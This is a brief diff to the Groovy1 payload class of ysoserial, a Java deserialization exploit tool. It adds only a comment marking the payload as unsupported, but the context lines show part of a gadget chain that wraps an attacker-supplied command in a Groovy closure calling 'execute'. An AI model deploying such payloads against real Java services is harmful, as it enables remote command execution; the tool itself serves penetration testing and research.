@@ -30,6 +30,8 @@ import ysoserial.payloads.util.PayloadRunner;
 @Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
 @Authors({ Authors.FROHOFF })
 public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
+	
+	// federicodotta - not supported	
 
 	public InvocationHandler getObject(final String command, String attackType) throws Exception {
 		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
